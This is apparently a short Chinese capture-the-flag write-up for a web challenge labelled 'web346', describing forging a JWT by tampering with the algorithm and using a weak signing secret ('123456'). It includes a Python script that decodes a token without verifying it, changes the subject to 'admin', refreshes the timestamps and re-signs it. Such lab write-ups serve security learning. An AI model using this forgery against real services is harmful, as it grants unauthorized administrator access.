# web346
![](vx_images/200636042253163.png)
直接指控算法,改用户为admin
且BP直接检测出了JWT弱口令
![](vx_images/592727139892619.png)
试一试伪造令牌的方法:
构造前:
![](vx_images/150398815628271.png)
构造后:
![](vx_images/109757593202042.png)
![](vx_images/398186136961270.png)
python代码:
```
import jwt
from datetime import datetime, timedelta

# 1. 准备原始JWT和弱密钥
original_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTc1MzcxNDU0NSwiZXhwIjoxNzUzNzIxNzQ1LCJuYmYiOjE3NTM3MTQ1NDUsInN1YiI6InVzZXIiLCJqdGkiOiJjZmNhZjgyMWJkZTJiNTQ4MTNmMjUxMzJlOWU1OGYwMCJ9.jyanzpG4P5enIrwvRQc1xWHM8J51UPJmzpsS_LUEMYo"
weak_secret = "123456"

# 2. 解码原始JWT获取payload
try:
    # 不验证签名直接解码
    decoded_payload = jwt.decode(
        original_jwt,
        options={"verify_signature": False}
    )
    print("原始Payload:\n", decoded_payload)
except Exception as e:
    print("解码错误:", e)
    exit()

# 3. 篡改关键声明（越权）
decoded_payload["sub"] = "admin"  # 普通用户变管理员
# decoded_payload["role"] = "superadmin"  # 可添加新声明
# decoded_payload["is_admin"] = True      # 布尔值声明

# 4. 更新时间戳（确保未过期）
current_time = int(datetime.now().timestamp())
decoded_payload["iat"] = current_time  # 签发时间
decoded_payload["nbf"] = current_time  # 生效时间
decoded_payload["exp"] = current_time + 3600  # 1小时后过期

# 5. 重新生成JWT签名
try:
    # 使用弱密钥生成新token
    new_jwt = jwt.encode(
        payload=decoded_payload,
        key=weak_secret,
        algorithm="HS256"
    )
    print("\n🔐 生成的恶意JWT:\n", new_jwt)
except Exception as e:
    print("签名生成错误:", e)
    exit()

# 6. 验证篡改后的JWT（可选）
try:
    verification = jwt.decode(
        new_jwt,
        weak_secret,
        algorithms=["HS256"]
    )
    print("\n✅ 签名验证通过:")
    print("当前身份:", verification.get("sub", ""))
    print("管理员权限:", verification.get("is_admin", False))
except jwt.InvalidSignatureError:
    print("❌ 签名验证失败")
```